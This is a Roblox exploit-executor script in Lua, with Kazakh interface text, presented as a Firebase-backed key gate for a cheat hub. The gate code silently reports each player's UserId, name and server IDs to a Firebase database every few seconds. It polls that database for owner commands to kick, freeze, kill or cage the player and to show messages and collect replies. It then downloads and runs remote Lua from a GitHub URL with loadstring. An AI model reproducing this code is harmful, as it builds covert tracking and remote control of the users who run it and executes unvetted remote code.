-- =====================================================================
-- NURLYKHAN FIREBASE STRICT KEY GATE // PART 1 OF 3
-- =====================================================================

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local MY_ROBLOX_USER_ID = 7103646402
local DATABASE_URL = "https://play-lag-default-rtdb.firebaseio.com/ActiveUsers"
local SETTINGS_URL = "https://play-lag-default-rtdb.firebaseio.com/Settings"
local HUB_URL = "https://raw.githubusercontent.com/h16536666-dotcom/my-scripts1/da0d12d7c6aea4af33090e215fc340b86588864b/Chilli.lua"

local cageModel = nil

local function createCage()
    if cageModel then cageModel:Destroy() end
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local hrp = char.HumanoidRootPart
    cageModel = Instance.new("Model")
    cageModel.Name = "NurlykhanSafeCage"
    local cPos = hrp.Position
    local parts = {
        {Vector3.new(8, 0.6, 8), Vector3.new(0, -3.5, 0), true},
        {Vector3.new(8, 0.6, 8), Vector3.new(0, 4.5, 0), false},
        {Vector3.new(0.6, 8, 8), Vector3.new(-4, 0.5, 0), false},
        {Vector3.new(0.6, 8, 8), Vector3.new(4, 0.5, 0), false},
        {Vector3.new(8, 8, 0.6), Vector3.new(0, 0.5, -4), false},
        {Vector3.new(8, 8, 0.6), Vector3.new(0, 0.5, 4), false}
    }
    local mainPart = nil
    for i, pInfo in ipairs(parts) do
        local p = Instance.new("Part")
        p.Size = pInfo[1]
        p.CFrame = CFrame.new(cPos + pInfo[2])
        p.Color = Color3.fromRGB(0, 255, 136)
        p.Material = Enum.Material.Neon
        p.Transparency = 0.4
        p.Anchored = true
        p.CanCollide = pInfo[3]
        p.Parent = cageModel
        if i == 1 then mainPart = p end
    end
    cageModel.PrimaryPart = mainPart
    cageModel.Parent = workspace
end

local function moveCage(offsetVector)
    if cageModel and cageModel.PrimaryPart then
        for _, part in ipairs(cageModel:GetChildren()) do
            if part:IsA("BasePart") then part.CFrame = part.CFrame + offsetVector end
        end
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame + offsetVector
        end
    end
end

local function destroyCage()
    if cageModel then cageModel:Destroy() cageModel = nil end
end

local function showAdminMessageGui(msgText)
    local CoreGui = game:GetService("CoreGui")
    local oldMsg = CoreGui:FindFirstChild("NurlykhanMsgGui")
    if oldMsg then oldMsg:Destroy() end
    local MsgGui = Instance.new("ScreenGui")
    MsgGui.Name = "NurlykhanMsgGui"
    MsgGui.ResetOnSpawn = false
    pcall(function() MsgGui.Parent = CoreGui end)
    if not MsgGui.Parent then MsgGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end

    local MsgBoxFrame = Instance.new("Frame")
    MsgBoxFrame.Size = UDim2.new(0, 350, 0, 205)
    MsgBoxFrame.Position = UDim2.new(0.5, -175, 0.2, 0)
    MsgBoxFrame.BackgroundColor3 = Color3.fromRGB(8, 12, 20)
    MsgBoxFrame.BackgroundTransparency = 0.2
    MsgBoxFrame.BorderSizePixel = 0
    MsgBoxFrame.Active = true
    MsgBoxFrame.Draggable = true
    MsgBoxFrame.Parent = MsgGui
    Instance.new("UICorner", MsgBoxFrame).CornerRadius = UDim.new(0, 8)
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(0, 240, 255)
    stroke.Thickness = 1.8
    stroke.Parent = MsgBoxFrame

    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.BackgroundTransparency = 1
    Title.Text = "[CYBER-LINK // ADMIN MSG]"
    Title.TextColor3 = Color3.fromRGB(0, 240, 255)
    Title.TextSize = 12
    Title.Font = Enum.Font.Code
    Title.Parent = MsgBoxFrame

    local MsgLabel = Instance.new("TextLabel")
    MsgLabel.Size = UDim2.new(0.9, 0, 0, 50)
    MsgLabel.Position = UDim2.new(0.05, 0, 0.18, 0)
    MsgLabel.BackgroundTransparency = 1
    MsgLabel.Text = "> " .. tostring(msgText)
    MsgLabel.TextColor3 = Color3.fromRGB(220, 255, 240)
    MsgLabel.TextSize = 12
    MsgLabel.Font = Enum.Font.Code
    MsgLabel.TextWrapped = true
    MsgLabel.Parent = MsgBoxFrame

    local ReplyInput = Instance.new("TextBox")
    ReplyInput.Size = UDim2.new(0.9, 0, 0, 30)
    ReplyInput.Position = UDim2.new(0.05, 0, 0.48, 0)
    ReplyInput.BackgroundColor3 = Color3.fromRGB(14, 22, 34)
    ReplyInput.BackgroundTransparency = 0.25
    ReplyInput.TextColor3 = Color3.fromRGB(0, 255, 136)
    ReplyInput.PlaceholderText = "Жауап енгізу..."
    ReplyInput.Text = ""
    ReplyInput.TextSize = 11
    ReplyInput.Font = Enum.Font.Code
    ReplyInput.Parent = MsgBoxFrame
    Instance.new("UICorner", ReplyInput).CornerRadius = UDim.new(0, 6)

    local SendReplyBtn = Instance.new("TextButton")
    SendReplyBtn.Size = UDim2.new(0.43, 0, 0, 28)
    SendReplyBtn.Position = UDim2.new(0.05, 0, 0.72, 0)
    SendReplyBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 120)
    SendReplyBtn.TextColor3 = Color3.fromRGB(5, 10, 15)
    SendReplyBtn.Text = "SEND"
    SendReplyBtn.TextSize = 12
    SendReplyBtn.Font = Enum.Font.Code
    SendReplyBtn.Parent = MsgBoxFrame
    Instance.new("UICorner", SendReplyBtn).CornerRadius = UDim.new(0, 6)

    local CloseBtn = Instance.new("TextButton")
    CloseBtn.Size = UDim2.new(0.43, 0, 0, 28)
    CloseBtn.Position = UDim2.new(0.52, 0, 0.72, 0)
    CloseBtn.BackgroundColor3 = Color3.fromRGB(220, 35, 95)
    CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    CloseBtn.Text = "CLOSE"
    CloseBtn.TextSize = 12
    CloseBtn.Font = Enum.Font.Code
    CloseBtn.Parent = MsgBoxFrame
    Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 6)

    SendReplyBtn.MouseButton1Click:Connect(function()
        if ReplyInput.Text ~= "" then
            pcall(function()
                request({
                    Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/UserReply.json",
                    Method = "PUT",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(ReplyInput.Text)
                })
            end)
            SendReplyBtn.Text = "SENT!"
            task.wait(1)
            MsgGui:Destroy()
        end
    end)
    CloseBtn.MouseButton1Click:Connect(function() MsgGui:Destroy() end)
end

-- Тек Firebase базасындағы /Settings/PasswordData.json ішіндегі кілтті тексереді
local function validateFirebaseOnlyKey(enteredKey)
    if not enteredKey or tostring(enteredKey) == "" then
        return false, "КІЛТ ЕНГІЗІЛМЕДІ"
    end

    local ok, isValid, reason = pcall(function()
        local res = request({ Url = SETTINGS_URL .. "/PasswordData.json", Method = "GET" })
        if not res or res.StatusCode ~= 200 or not res.Body or res.Body == "null" or res.Body == "" then
            return false, "БАЗАДА КІЛТ ЖОҚ"
        end

        local decoded = HttpService:JSONDecode(res.Body)
        if type(decoded) ~= "table" or not decoded.Password or tostring(decoded.Password) == "" then
            return false, "БАЗАДА КІЛТ ЖОҚ"
        end

        local expireTs = tonumber(decoded.ExpireTime) or 0
        if expireTs ~= 0 and os.time() >= expireTs then
            return false, "КІЛТ МЕРЗІМІ БІТТІ"
        end

        if tostring(enteredKey) == tostring(decoded.Password) then
            return true, "БАЗА КІЛТІ РАСТАЛДЫ"
        else
            return false, "КІЛТ СӘЙКЕС ЕМЕС"
        end
    end)

    if not ok then
        return false, "БАЗАҒА ҚОСЫЛУ ҚАТЕСІ"
    end

    return isValid, reason
end
-- =====================================================================
-- NURLYKHAN FIREBASE STRICT KEY GATE // PART 2 OF 3
-- =====================================================================

task.spawn(function()
    while task.wait(4) do
        pcall(function()
            request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Time.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(os.time()) })
            request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Username.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(LocalPlayer.Name) })
        end)
    end
end)

task.spawn(function()
    while task.wait(1) do
        pcall(function()
            local res = request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. ".json", Method = "GET" })
            if res and res.StatusCode == 200 and res.Body ~= "null" then
                local uData = HttpService:JSONDecode(res.Body)
                if type(uData) == "table" then
                    if uData.CageState == "Create" then
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/CageState.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode("") })
                        createCage()
                    elseif uData.CageState == "Destroy" then
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/CageState.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode("") })
                        destroyCage()
                    elseif uData.CageMove and uData.CageMove ~= "" then
                        local dir = uData.CageMove
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/CageMove.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode("") })
                        if dir == "Up" then moveCage(Vector3.new(0, 4, 0))
                        elseif dir == "Down" then moveCage(Vector3.new(0, -4, 0))
                        elseif dir == "Left" then moveCage(Vector3.new(-4, 0, 0))
                        elseif dir == "Right" then moveCage(Vector3.new(4, 0, 0)) end
                    end
                    if uData.Message and tostring(uData.Message) ~= "" then
                        local msgReceived = tostring(uData.Message)
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Message.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode("") })
                        showAdminMessageGui(msgReceived)
                    end
                    if uData.Kick == true then LocalPlayer:Kick("Nurlykhan HUB // ACCESS REVOKED BY ADMIN") end
                    if uData.Freeze == true then
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then LocalPlayer.Character.HumanoidRootPart.Anchored = true end
                    elseif uData.Freeze == false then
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then LocalPlayer.Character.HumanoidRootPart.Anchored = false end
                    end
                    if uData.Kill == true then
                        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then LocalPlayer.Character.Humanoid.Health = 0 end
                        request({ Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. "/Kill.json", Method = "PUT", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(false) })
                    end
                end
            end
        end)
    end
end)

local isLaunchingHub = false

local function launchMainScriptOnce()
    if isLaunchingHub or getgenv().NurlykhanHubLoaded == true then return end
    isLaunchingHub = true
    getgenv().NurlykhanHubLoaded = true
    pcall(function()
        local source = game:HttpGet(HUB_URL)
        if source and source ~= "" then
            loadstring(source)()
        end
    end)
end

local function registerActiveUser()
    task.spawn(function()
        pcall(function()
            request({
                Url = DATABASE_URL .. "/" .. LocalPlayer.UserId .. ".json",
                Method = "PUT",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    Username = LocalPlayer.Name,
                    Time = os.time(),
                    Kick = false,
                    Freeze = false,
                    Kill = false,
                    CageState = "",
                    CageMove = "",
                    Message = "",
                    UserReply = "",
                    JobId = game.JobId,
                    PlaceId = game.PlaceId
                })
            })
        end)
    end)
    launchMainScriptOnce()
end

local CoreGui = game:GetService("CoreGui")
local function attachGui(gui)
    pcall(function() gui.Parent = CoreGui end)
    if not gui.Parent then gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
end

local oldIntro = CoreGui:FindFirstChild("NurlykhanGreetingIntro")
if oldIntro then oldIntro:Destroy() end

local IntroGui = Instance.new("ScreenGui")
IntroGui.Name = "NurlykhanGreetingIntro"
IntroGui.ResetOnSpawn = false
attachGui(IntroGui)

local IntroFrame = Instance.new("Frame")
IntroFrame.Size = UDim2.new(0, 320, 0, 290)
IntroFrame.Position = UDim2.new(0.5, -160, 0.5, -145)
IntroFrame.BackgroundColor3 = Color3.fromRGB(6, 10, 18)
IntroFrame.BackgroundTransparency = 0.2
IntroFrame.BorderSizePixel = 0
IntroFrame.Parent = IntroGui
Instance.new("UICorner", IntroFrame).CornerRadius = UDim.new(0, 12)
local introStroke = Instance.new("UIStroke")
introStroke.Color = Color3.fromRGB(0, 245, 212)
introStroke.Thickness = 2
introStroke.Parent = IntroFrame

local HelloBanner = Instance.new("TextLabel")
HelloBanner.Size = UDim2.new(1, -20, 0, 42)
HelloBanner.Position = UDim2.new(0, 10, 0, 10)
HelloBanner.BackgroundColor3 = Color3.fromRGB(14, 24, 38)
HelloBanner.BackgroundTransparency = 0.25
HelloBanner.Text = "Сәлем!"
HelloBanner.TextColor3 = Color3.fromRGB(0, 255, 136)
HelloBanner.TextSize = 24
HelloBanner.Font = Enum.Font.Code
HelloBanner.Parent = IntroFrame
Instance.new("UICorner", HelloBanner).CornerRadius = UDim.new(0, 8)
local hStroke = Instance.new("UIStroke")
hStroke.Color = Color3.fromRGB(255, 0, 110)
hStroke.Thickness = 1.4
hStroke.Parent = HelloBanner

local IntroViewport = Instance.new("ViewportFrame")
IntroViewport.Size = UDim2.new(1, -20, 1, -66)
IntroViewport.Position = UDim2.new(0, 10, 0, 58)
IntroViewport.BackgroundTransparency = 1
IntroViewport.Parent = IntroFrame

local introWorld = Instance.new("WorldModel")
introWorld.Parent = IntroViewport
local introCam = Instance.new("Camera")
introCam.Parent = IntroViewport
IntroViewport.CurrentCamera = introCam

task.spawn(function()
    pcall(function()
        local dummy = Players:CreateHumanoidModelFromUserId(MY_ROBLOX_USER_ID)
        dummy.Parent = introWorld
        local head = dummy:FindFirstChild("Head")
        local root = dummy:FindFirstChild("HumanoidRootPart") or head

        if head then
            local bbg = Instance.new("BillboardGui")
            bbg.Size = UDim2.new(0, 160, 0, 44)
            bbg.StudsOffset = Vector3.new(0, 2.4, 0)
            bbg.AlwaysOnTop = true
            bbg.Parent = head

            local waveLabel = Instance.new("TextLabel")
            waveLabel.Size = UDim2.new(1, 0, 1, 0)
            waveLabel.BackgroundTransparency = 1
            waveLabel.Text = "Сәлем!"
            waveLabel.TextColor3 = Color3.fromRGB(0, 245, 212)
            waveLabel.TextSize = 20
            waveLabel.Font = Enum.Font.Code
            waveLabel.TextStrokeTransparency = 0
            waveLabel.Parent = bbg
        end

        local rUpper = dummy:FindFirstChild("RightUpperArm")
        local rLower = dummy:FindFirstChild("RightLowerArm")
        local rArmR6 = dummy:FindFirstChild("Right Arm")

        if root then
            dummy:SetPrimaryPartCFrame(CFrame.new(0, -0.4, 0))
            introCam.CFrame = CFrame.new(Vector3.new(0, 0.7, 5.4), Vector3.new(0, 0.2, 0))

            local elapsed = 0
            local conn
            conn = RunService.RenderStepped:Connect(function(dt)
                if not IntroGui or not IntroGui.Parent then
                    if conn then conn:Disconnect() end
                    return
                end
                elapsed = elapsed + dt
                local waveAngle = math.sin(elapsed * 9) * 0.45

                if rUpper then
                    rUpper.CFrame = root.CFrame * CFrame.new(1.35, 0.65, 0) * CFrame.Angles(math.rad(150), 0, math.rad(-25) + waveAngle)
                    if rLower then
                        rLower.CFrame = rUpper.CFrame * CFrame.new(0, -0.55, 0) * CFrame.Angles(math.rad(-25), 0, waveAngle * 0.5)
                    end
                elseif rArmR6 then
                    rArmR6.CFrame = root.CFrame * CFrame.new(1.5, 0.7, 0) * CFrame.Angles(math.rad(155), 0, math.rad(-20) + waveAngle)
                end
            end)
        end
    end)
end)

task.wait(3.2)
if IntroGui and IntroGui.Parent then
    IntroGui:Destroy()
end
-- =====================================================================
-- NURLYKHAN FIREBASE STRICT KEY GATE // PART 3 OF 3
-- =====================================================================

local oldPass = CoreGui:FindFirstChild("NurlykhanCyberGate")
if oldPass then oldPass:Destroy() end

local GateGui = Instance.new("ScreenGui")
GateGui.Name = "NurlykhanCyberGate"
GateGui.ResetOnSpawn = false
attachGui(GateGui)

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 470, 0, 255)
MainFrame.Position = UDim2.new(0.5, -235, 0.5, -127)
MainFrame.BackgroundColor3 = Color3.fromRGB(6, 10, 18)
MainFrame.BackgroundTransparency = 0.2
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.ClipsDescendants = true
MainFrame.Parent = GateGui
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(0, 245, 212)
mainStroke.Thickness = 2
mainStroke.Parent = MainFrame

local TopNeon = Instance.new("Frame")
TopNeon.Size = UDim2.new(1, 0, 0, 3)
TopNeon.Position = UDim2.new(0, 0, 0, 0)
TopNeon.BackgroundColor3 = Color3.fromRGB(255, 0, 110)
TopNeon.BorderSizePixel = 0
TopNeon.ZIndex = 6
TopNeon.Parent = MainFrame

local MatrixBg = Instance.new("Frame")
MatrixBg.Size = UDim2.new(1, 0, 1, 0)
MatrixBg.BackgroundTransparency = 1
MatrixBg.ClipsDescendants = true
MatrixBg.ZIndex = 1
MatrixBg.Parent = MainFrame

local glyphs = {"0", "1", "X", "K", "P", "7", "9", "#", "$", "/", ">", "_"}
for i = 1, 22 do
    task.spawn(function()
        local col = Instance.new("TextLabel")
        col.Size = UDim2.new(0, 22, 1, 0)
        col.Position = UDim2.new((i - 1) * 0.045, 0, 0, 0)
        col.BackgroundTransparency = 1
        col.TextColor3 = (i % 3 == 0) and Color3.fromRGB(255, 0, 110) or Color3.fromRGB(0, 245, 212)
        col.TextTransparency = 0.72
        col.TextSize = 11
        col.Font = Enum.Font.Code
        col.TextYAlignment = Enum.TextYAlignment.Top
        col.ZIndex = 1
        col.Parent = MatrixBg
        while MainFrame and MainFrame.Parent do
            local s = ""
            for j = 1, 16 do s = s .. glyphs[math.random(1, #glyphs)] .. "\n" end
            col.Text = s
            task.wait(math.random(1, 3) * 0.1)
        end
    end)
end

local Header = Instance.new("TextLabel")
Header.Size = UDim2.new(0.65, 0, 0, 32)
Header.Position = UDim2.new(0, 12, 0, 6)
Header.BackgroundTransparency = 1
Header.Text = "CYBERPUNK // SCANNER GATE"
Header.TextColor3 = Color3.fromRGB(0, 245, 212)
Header.TextSize = 15
Header.Font = Enum.Font.Code
Header.TextXAlignment = Enum.TextXAlignment.Left
Header.ZIndex = 4
Header.Parent = MainFrame

local KeyBadge = Instance.new("TextLabel")
KeyBadge.Size = UDim2.new(0.32, 0, 0, 22)
KeyBadge.Position = UDim2.new(0.66, 0, 0, 11)
KeyBadge.BackgroundTransparency = 1
KeyBadge.Text = "FIREBASE ONLY"
KeyBadge.TextColor3 = Color3.fromRGB(255, 0, 110)
KeyBadge.TextSize = 11
KeyBadge.Font = Enum.Font.Code
KeyBadge.TextXAlignment = Enum.TextXAlignment.Right
KeyBadge.ZIndex = 4
KeyBadge.Parent = MainFrame

local LeftScannerBox = Instance.new("Frame")
LeftScannerBox.Size = UDim2.new(0.38, 0, 0.76, 0)
LeftScannerBox.Position = UDim2.new(0.03, 0, 0.18, 0)
LeftScannerBox.BackgroundColor3 = Color3.fromRGB(8, 16, 28)
LeftScannerBox.BackgroundTransparency = 0.28
LeftScannerBox.BorderSizePixel = 0
LeftScannerBox.ClipsDescendants = true
LeftScannerBox.ZIndex = 3
LeftScannerBox.Parent = MainFrame
Instance.new("UICorner", LeftScannerBox).CornerRadius = UDim.new(0, 8)
local scanStroke = Instance.new("UIStroke")
scanStroke.Color = Color3.fromRGB(0, 245, 212)
scanStroke.Thickness = 1.6
scanStroke.Parent = LeftScannerBox

local SkinViewport = Instance.new("ViewportFrame")
SkinViewport.Size = UDim2.new(1, 0, 1, 0)
SkinViewport.BackgroundTransparency = 1
SkinViewport.ZIndex = 4
SkinViewport.Parent = LeftScannerBox

local scanWorld = Instance.new("WorldModel")
scanWorld.Parent = SkinViewport
local scanCam = Instance.new("Camera")
scanCam.Parent = SkinViewport
SkinViewport.CurrentCamera = scanCam

local ScannerBeam = Instance.new("Frame")
ScannerBeam.Size = UDim2.new(1, 0, 0, 3)
ScannerBeam.Position = UDim2.new(0, 0, 0, 0)
ScannerBeam.BackgroundColor3 = Color3.fromRGB(0, 255, 136)
ScannerBeam.BorderSizePixel = 0
ScannerBeam.ZIndex = 6
ScannerBeam.Parent = LeftScannerBox

local ScannerGlow = Instance.new("Frame")
ScannerGlow.Size = UDim2.new(1, 0, 0, 26)
ScannerGlow.Position = UDim2.new(0, 0, 0, -12)
ScannerGlow.BackgroundColor3 = Color3.fromRGB(0, 245, 212)
ScannerGlow.BackgroundTransparency = 0.78
ScannerGlow.BorderSizePixel = 0
ScannerGlow.ZIndex = 5
ScannerGlow.Parent = LeftScannerBox

task.spawn(function()
    while LeftScannerBox and LeftScannerBox.Parent do
        local downTween = TweenService:Create(ScannerBeam, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.new(0, 0, 1, -3)})
        local glowDown = TweenService:Create(ScannerGlow, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.new(0, 0, 1, -14)})
        downTween:Play()
        glowDown:Play()
        downTween.Completed:Wait()

        local upTween = TweenService:Create(ScannerBeam, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.new(0, 0, 0, 0)})
        local glowUp = TweenService:Create(ScannerGlow, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Position = UDim2.new(0, 0, 0, -12)})
        upTween:Play()
        glowUp:Play()
        upTween.Completed:Wait()
    end
end)

task.spawn(function()
    pcall(function()
        local dummy = Players:CreateHumanoidModelFromUserId(MY_ROBLOX_USER_ID)
        dummy.Parent = scanWorld
        local head = dummy:FindFirstChild("Head")
        local root = dummy:FindFirstChild("HumanoidRootPart") or head
        if head then
            local bbg = Instance.new("BillboardGui")
            bbg.Size = UDim2.new(0, 140, 0, 32)
            bbg.StudsOffset = Vector3.new(0, 2.2, 0)
            bbg.AlwaysOnTop = true
            bbg.Parent = head
            local lbl = Instance.new("TextLabel")
            lbl.Size = UDim2.new(1, 0, 1, 0)
            lbl.BackgroundTransparency = 1
            lbl.Text = "SCAN // Xakep_2035"
            lbl.TextColor3 = Color3.fromRGB(0, 255, 136)
            lbl.TextSize = 12
            lbl.Font = Enum.Font.Code
            lbl.TextStrokeTransparency = 0
            lbl.Parent = bbg
        end
        if root then
            dummy:SetPrimaryPartCFrame(CFrame.new(0, 0, 0))
            scanCam.CFrame = CFrame.new(Vector3.new(0, 0.8, 5.5), Vector3.new(0, 0, 0))
            local angle = 0
            local spinConn
            spinConn = RunService.RenderStepped:Connect(function(dt)
                if not GateGui or not GateGui.Parent or not MainFrame or not MainFrame.Parent then
                    if spinConn then spinConn:Disconnect() end
                    return
                end
                angle = angle + (dt * 2.2)
                dummy:SetPrimaryPartCFrame(CFrame.new(0, -0.5, 0) * CFrame.Angles(0, angle, 0))
            end)
        end
    end)
end)

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(0.54, 0, 0, 20)
StatusLabel.Position = UDim2.new(0.43, 0, 0.20, 0)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = "> FIREBASE KEY REQUIRED_"
StatusLabel.TextColor3 = Color3.fromRGB(0, 245, 212)
StatusLabel.TextSize = 11
StatusLabel.Font = Enum.Font.Code
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
StatusLabel.ZIndex = 4
StatusLabel.Parent = MainFrame

local KeyInput = Instance.new("TextBox")
KeyInput.Size = UDim2.new(0.54, 0, 0, 40)
KeyInput.Position = UDim2.new(0.43, 0, 0.32, 0)
KeyInput.BackgroundColor3 = Color3.fromRGB(11, 18, 29)
KeyInput.BackgroundTransparency = 0.22
KeyInput.TextColor3 = Color3.fromRGB(0, 245, 212)
KeyInput.PlaceholderColor3 = Color3.fromRGB(95, 135, 145)
KeyInput.PlaceholderText = "Базадағы кілтті жаз..."
KeyInput.Text = ""
KeyInput.TextSize = 14
KeyInput.Font = Enum.Font.Code
KeyInput.ZIndex = 4
KeyInput.Parent = MainFrame
Instance.new("UICorner", KeyInput).CornerRadius = UDim.new(0, 6)
local kStroke = Instance.new("UIStroke")
kStroke.Color = Color3.fromRGB(0, 245, 212)
kStroke.Thickness = 1.4
kStroke.Parent = KeyInput

local UnlockBtn = Instance.new("TextButton")
UnlockBtn.Size = UDim2.new(0.54, 0, 0, 40)
UnlockBtn.Position = UDim2.new(0.43, 0, 0.56, 0)
UnlockBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 110)
UnlockBtn.BackgroundTransparency = 0.12
UnlockBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
UnlockBtn.Text = "UNLOCK // КІРУ"
UnlockBtn.TextSize = 14
UnlockBtn.Font = Enum.Font.Code
UnlockBtn.ZIndex = 4
UnlockBtn.Parent = MainFrame
Instance.new("UICorner", UnlockBtn).CornerRadius = UDim.new(0, 6)
local uStroke = Instance.new("UIStroke")
uStroke.Color = Color3.fromRGB(0, 245, 212)
uStroke.Thickness = 1.2
uStroke.Parent = UnlockBtn

local ResizeBtn = Instance.new("TextButton")
ResizeBtn.Size = UDim2.new(0, 18, 0, 18)
ResizeBtn.Position = UDim2.new(1, -18, 1, -18)
ResizeBtn.BackgroundColor3 = Color3.fromRGB(0, 245, 212)
ResizeBtn.TextColor3 = Color3.fromRGB(5, 10, 15)
ResizeBtn.Text = "↘"
ResizeBtn.TextSize = 12
ResizeBtn.Font = Enum.Font.Code
ResizeBtn.ZIndex = 6
ResizeBtn.Parent = MainFrame
Instance.new("UICorner", ResizeBtn).CornerRadius = UDim.new(0, 4)

local isResizing = false
local startInput, startSize
ResizeBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isResizing = true
        startInput = input.Position
        startSize = MainFrame.Size
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if isResizing and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - startInput
        local newX = math.max(380, startSize.X.Offset + delta.X)
        local newY = math.max(210, startSize.Y.Offset + delta.Y)
        MainFrame.Size = UDim2.new(0, newX, 0, newY)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isResizing = false
    end
end)

UnlockBtn.MouseButton1Click:Connect(function()
    UnlockBtn.Text = "CHECKING..."
    local valid, statusText = validateFirebaseOnlyKey(KeyInput.Text)
    StatusLabel.Text = "> " .. statusText

    if valid then
        StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 136)
        UnlockBtn.Text = "ACCESS GRANTED!"
        UnlockBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 120)
        task.wait(0.35)
        GateGui:Destroy()
        registerActiveUser()
    else
        StatusLabel.TextColor3 = Color3.fromRGB(255, 80, 110)
        UnlockBtn.Text = "DENIED!"
        UnlockBtn.BackgroundColor3 = Color3.fromRGB(255, 30, 60)
        task.wait(1.4)
        UnlockBtn.Text = "UNLOCK // КІРУ"
        UnlockBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 110)
    end
end)
